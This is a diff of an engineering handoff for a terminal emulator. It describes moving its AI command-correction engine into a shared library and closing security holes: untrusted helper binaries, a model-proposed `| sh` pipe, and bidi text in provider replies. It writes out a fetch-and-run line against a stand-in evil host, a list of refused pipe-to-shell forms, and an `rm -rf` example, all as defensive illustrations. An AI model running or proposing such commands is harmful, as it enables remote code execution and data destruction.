@@ -1,6 +1,6 @@
 # Engineering handoff
 
-Updated: 2026-08-29 (shared AI chat store adoption)
+Updated: 2026-08-29 (shared command-correction engine adoption)
 
 This baseline exact-pins the hardened shared core and jagent revisions and upgrades
 Agent review, terminal parsing, configuration, persistence, sidebar/history, links,
@@ -9,6 +9,152 @@ identities are checked, and terminal-controlled clipboard and link capabilities
 fail closed.
 
 ## Completed since the previous handoff
+
+- **Shared command-correction engine adoption — the engine half leaves ember
+  (2026-08-29)**: `src/command_correction.rs` drops from 2,335 lines to an
+  889-line shim (566 before the test module) over
+  `jterm_core::command_correction`, pinned at `badcce2`. Classification, token
+  extraction, ranking, the safety gate, the prompt, the reply parser, the
+  helper-trust predicate, the probe layer, the resolvers and the request epoch
+  machine are gone from this repo; none of them ever mentioned egui. All four
+  family terminals carried that same engine — anvil 1,817 lines, forge 2,148,
+  ember 2,335, frost 1,552 — and all four had drifted, so the core now carries
+  their union (3,937 lines including tests) and the apps shed 6,294 lines
+  between them. What stayed is exactly ember's surface: the floating
+  `egui::Window` keyed by session id with the CENTER_BOTTOM anchor and the
+  theme-derived `Frame`, the bounded 2 s focus retry gated on
+  `prompt_clean_idle`, the `armed` first-frame rule that stops a trailing Enter
+  in the same input batch from approving a just-created card, the 50 ms
+  `request_repaint_after` pump, and the `CorrectionEffect` /
+  `CorrectionUiOutcome` types `app/commands.rs` applies to the PTY. No call site
+  outside the module changed, and `Cargo.lock` moves only the pin (plus
+  `fuzzy-matcher`, which ember already depends on directly, appearing under
+  `jterm_core`); `jagent` stays at `f9383ec`.
+
+  The three legitimate disagreements between the copies became construction-time
+  policy with no `Default` where safety is involved, following the
+  `BusyChatPolicy` precedent from the chat-store round. Ember states all three
+  and nothing else: `LocalEvidence::SameNamespace { search_path: <split PATH>,
+  helpers: HelperStrategy::TrustedPathScan }` (ember owns its PTYs, so this
+  process's namespace *is* the failed command's), `context_sharing(config)` from
+  `ensure_semantic_context_sharing_allowed`, and a named probe thread. The
+  policy is rebuilt per request because the consent switch is a live config
+  value. One dead branch disappeared with the move: ember's copy consulted
+  `jterm_core::host::is_flatpak()` — the only occurrence of that symbol anywhere
+  in ember, inherited from anvil — to decide whether to enumerate PATH, which
+  could only ever be false here, and was inverted anyway.
+
+- **Three security holes in the correction path, two of them ember's own
+  (2026-08-29)**: this surface decides whether a model-proposed command may be
+  offered for execution into a pre-filled, auto-focused field, so the copies'
+  divergences were not style.
+
+  *A third user's binary was a trusted system helper.* Ember asked
+  `owner_uid == euid || mode & 0o022 != 0` for "untrusted", so a binary owned by
+  another account at mode 0755 answered "not untrusted" — trusted — and helper
+  resolution reached it by scanning the user's own `PATH`. On a shared build box
+  with `/opt/vendor/bin/bash` owned by uid 1234 ahead of `/usr/bin`, any failed
+  command spawned it automatically. Clamping the child's `PATH` never helped:
+  the helper was itself the hostile binary. The same expression was wrong
+  inverted for root — `owner_uid == euid` is true for every root-owned system
+  binary under `sudo ember` or in a container, so every helper was refused and
+  `apt-cache pkgnames` could never run, with no diagnostic anywhere the user
+  would see. `jterm_core::helper::trusted_component` already answered both
+  halves and only frost used it; the shim now resolves through it. The cost is
+  real and worth stating: on a host where neither `bash` nor `apt-cache` passes
+  the predicate, PATH evidence survives (name enumeration falls back to a
+  read-only directory walk of the same `PATH`), but APT-verified package
+  corrections disappear, because nothing else can answer that question.
+
+  *A candidate could add a pipe into a shell.* `syntax_markers` only tested
+  whether a marker was *present*, so against an original that already contained
+  a pipe, appending `| sh` introduced no new marker and passed the superset
+  check. Ember had no separate check at all (only forge did, as four literal
+  spellings). A failed `curl -sS https://example.invalid/setup | head -20` could
+  therefore be answered with `curl -sS https://evil.invalid/x | sh`, pre-filled
+  and focused. The shared rule splits the pipeline quote-aware and compares the
+  SET of interpreter stage names, pinned by a test against jagent's own lexer,
+  so `|  sh`, `| /bin/sh`, `| zsh`, `| dash`, `| busybox sh` and
+  `| xargs -n1 sh -c` are refused while `ls | gerp foo` → `ls | grep foo` is
+  still offered.
+
+  *Consent* is the one where ember was the family's best copy rather than its
+  worst: it was the only terminal that honoured `ai_share_command_context`
+  before shipping the failed command, the cwd and up to 8 KiB of output to a
+  provider, and that is now the union's `ContextSharing`, with no `Default` and
+  a `ConsentProof` witness that `correction_prompt` demands. Ember's observable
+  behaviour is unchanged here — withheld consent already meant no AI fallback —
+  but the shim no longer conditionally builds the client. It always builds it
+  and lets the policy refuse before the provider stage, which is the point of
+  moving consent into the type system rather than into a call site's `match`.
+
+- **The card stops trusting text it did not write, and admits when a draft is
+  destructive (2026-08-29)**: ember interpolated the provider's `message`
+  directly into `ui.label` one line above the editable, pre-filled,
+  auto-focused command field; `validate_message` checked length and NUL only,
+  so a reply embedding U+202E could reverse the rendered order of the prose
+  beside the command about to be inserted at the shell prompt. The card now
+  reads only the engine's sanitised display accessors — `display_title`,
+  `display_badge`, `display_description` — which collapse to one display line
+  with controls and bidi replaced by U+FFFD. `set_feedback` sanitises and bounds
+  to 200 characters on the way in, so the accept-path rejection string and the
+  app's PTY-write error get the same treatment; note that ember's own
+  provider-JSON parse errors never reached the card in the first place (they
+  went to `log::debug`), so that particular bound is defence, not a repair.
+  Separately, the card gained the destructive-risk label anvil and forge already
+  had, in ember's own Agent-card idiom (`⚠ destructive: {reason}` in
+  `error_fg_color`). `is_dangerous` never gated whether a candidate is
+  *offered* — it is one conjunct of `verified_run_allowed`, whose
+  `is_verified()` conjunct is false for every AI and target-output proposal — so
+  `rm -rf ~/work` always reached the card and ember drew it in exactly the
+  chrome it gave `git status`. It is recomputed after each frame's edit, so a
+  draft the user makes destructive is labelled on the same frame, and the
+  primary action's label is now computed after that edit rather than from the
+  previous frame's buffer, so "Run verified command" / "Insert for review" can
+  no longer be one frame stale relative to what the button does.
+
+- **Fewer cards, and the ones that stop appearing are the untrustworthy ones
+  (2026-08-29)**: a completion the shell did not itself report no longer raises
+  a correction card. Ember checked nothing here even though its execution
+  journal, its Agent panel and its long-command toast all bail on
+  `is_trusted_completion()`. A `BoundaryInferred` block — a later prompt forced
+  it shut and the OSC 133 end mark never arrived — attributes stale scrollback
+  and a guessed status to a command, so the classifier could read "command not
+  found" out of the *previous* command's output and build the whole request,
+  prompt and card on that misattribution. Cards that used to appear after an
+  interrupted or force-closed block will stop appearing. A command line over
+  16 KiB is now declined at classification instead of being classified, ranked,
+  probed and prompted about; ember relied on `review_input`'s 256 KiB cap while
+  this surface's own declared budget has always been 16 KiB. Working-directory
+  handling in the provider payload also changed shape: a cwd over 4 KiB is now
+  sanitised and truncated into the payload rather than replaced wholesale by
+  `.`, and an absent cwd is sent as an empty string rather than `.`. Finally,
+  the set of programs this surface may ever execute narrowed from ember's
+  `{apt-cache, bash, sh, sleep, head}` name allow-list to the core's two closed
+  `TrustedHelper` constants (`bash`, `apt-cache`). No user-visible effect — both
+  call sites always passed `bash` or `apt-cache` — but `sh`, `sleep` and `head`
+  were in ember's *production* allow-list purely so one unit test could exercise
+  `run_capture`'s bounds.
+
+- **Tests follow the code they pin (2026-08-29)**: the module's suite goes from
+  23 tests to 7. Twenty that duplicated the engine are gone — the classifier,
+  ranking, reply parsing, the candidate gate, output sampling, the epoch
+  machine, the timeout boundary, and four probe/helper-trust tests that forked
+  real processes — and their subjects are tested in the core against its own
+  fixtures. Three that covered ember's wiring survive by name
+  (`disabled_monitor_and_agent_executions_never_start_a_request`,
+  `target_suggestion_flows_from_completion_to_presented_card`,
+  `failed_apply_keeps_the_card_and_success_retires_it`) and four are new:
+  `ember_states_its_correction_policy_explicitly` pins all three policy choices
+  including that the split `PATH` is actually present,
+  `only_a_shell_reported_completion_can_raise_a_card` pins the new trusted-
+  completion trigger,
+  `the_card_reads_only_engine_sanitised_text_and_labels_a_destructive_draft`
+  pins the accessors the card body reads and the destructive label, and
+  `a_disabled_surface_cancels_an_in_flight_request_and_drops_the_session`
+  pins the disabled-mid-flight path. The two safety tests were
+  mutation-checked: flipping `trusted_completion` to `true`, and `Withheld` to
+  `Consented`, each turns its test red.
 
 - **Shared AI chat store adoption — one library state machine for the family
   (2026-08-29)**: `src/ai_chat_store.rs` is now a 76-line shim over
@@ -569,24 +715,52 @@ fail closed.
 
 ## Remaining boundaries
 
-- **The AI chat surface is still uncommitted work in progress.**
-  `src/ai_chat_panel.rs`, `src/ai_chat_store.rs`, `src/ai_command_suggestion.rs`
-  are untracked and their wiring (`main.rs`, `app/state.rs`, `app/input.rs`,
-  `app/commands.rs`, `app/rendering.rs`, `app/tabs.rs`, `command_palette.rs`,
-  `keybindings.rs`) is unstaged, exactly as before this round. This round moved
-  that work's store onto the shared core and repaired defects in it; it did not
-  land it.
+- **This round is uncommitted.** `Cargo.toml`, `Cargo.lock` and
+  `src/command_correction.rs` are modified in the working tree and nothing is
+  staged. (The AI chat surface that the previous handoff listed here as
+  untracked has since landed — `src/ai_chat_panel.rs`, `src/ai_chat_store.rs`
+  and `src/ai_command_suggestion.rs` are tracked as of `b3d5ffd`, and the
+  correction surface itself as of `e297954`.)
 - **The shared-core pin advanced to a published revision.** `jterm_core` is
-  pinned at `1a04f1ef0d24cce7083cbbbb2efa7e34c02bdfcb`, the commit that
-  introduces `ai::chat_store`, and the transitive `jagent` in `Cargo.lock` is
-  `f9383ec56c7c94f1e25ba6fbeb17fa5e47132abf`. Both were published before
-  the pin moved, the temporary local `[patch]` used to develop the two
-  together is gone, and the full gate below — including `--locked` — was rerun
-  against the published revisions. Note that `UPGRADE_ROUNDS.md` round 37
-  records the pin advancing to `0f47569`; the manifest never held that value,
-  and the entry is left as written rather than rewritten after the fact.
+  pinned at `badcce222fb5471a6afbfc5d5e898e2bc3faf632`, the commit that
+  introduces `command_correction`, and the transitive `jagent` in `Cargo.lock`
+  is unchanged at `f9383ec56c7c94f1e25ba6fbeb17fa5e47132abf`. The core was
+  published before the pin moved, no local `[patch]` remains, and the gate
+  below — including `--locked` — was rerun against the published revision. The
+  only other line the lock moved is `fuzzy-matcher` appearing under
+  `jterm_core`; ember already depends on that crate directly, so no new crate
+  enters the build. Note that `UPGRADE_ROUNDS.md` round 37 records the pin
+  advancing to `0f47569`; the manifest never held that value, and the entry is
+  left as written rather than rewritten after the fact.
+- **`CorrectionRequestState::cancel_active` is private in the core**, so the
+  shim's disabled-mid-flight path calls `cancel(entry.generation)` where the old
+  copy called `cancel_active()`. Equivalent here — `entry.generation` is always
+  the live epoch except immediately after a `retire()`, at which point `active`
+  is already `None` and there is nothing to cancel — and
+  `a_disabled_surface_cancels_an_in_flight_request_and_drops_the_session` pins
+  the behaviour rather than the call. Recorded so the anvil/forge/frost ports do
+  not each rediscover it.
+- **`LocalEvidence::SameNamespace { search_path: Vec::new(), .. }` compiles and
+  silently disables all PATH evidence.** It fails closed, so it is not a hole,
+  and making it non-empty by construction would mean a `NonEmpty<Vec<PathBuf>>`
+  for little gain — but it is the one field of the policy where a wrong value is
+  silent rather than a compile error. Ember's policy test asserts the split
+  `PATH` is actually there. Everything else safety-relevant could not be omitted
+  and still compile: `LocalEvidence` and `ContextSharing` have no `Default`,
+  `CorrectionPolicy::new` takes all three arguments positionally, and
+  `CompletionFacts` is a struct literal whose fields are all required, so a
+  missing `trusted_completion` is a compile error.
+- **The card is still not exercised through a real egui frame.** Unchanged from
+  before this round — ember's previous suite never drove `show()` either, since
+  that needs a real `egui::Context` with input and a focus surface. The new
+  rendering test asserts on the exact accessors the card body reads
+  (`display_title` / `display_badge` / `display_description` / `risk` /
+  `run_allowed`) rather than on pixels, which is as close as this surface gets
+  without an Xvfb harness. The focus, arming and 2 s retry rules therefore
+  remain covered by reading only.
 - The font-input descriptor boundary recorded above was the last item carried
-  from the previous handoff; no other boundaries remain.
+  from the earlier handoffs; nothing else survives from them, and the items
+  above are this round's own.
 
 ## Release checks
 
@@ -601,6 +775,7 @@ bash scripts/test-install-paths.sh
 
 Run on 2026-08-29 for this tree: `cargo fmt --all -- --check` and
 `cargo clippy --locked --all-targets --all-features -- -D warnings` are clean,
-and `cargo test` reports 1,264 unit tests plus the native Codex worker
-end-to-end test passing with zero failures. The install-script checks were not
-re-run; nothing in this round touches `scripts/`.
+and `cargo test --locked` reports 947 library tests plus 1,248 binary tests plus
+the native Codex worker end-to-end test — 2,196 in total — passing with zero
+failures, against the published `badcce2` core. The install-script checks were
+not re-run; nothing in this round touches `scripts/`.
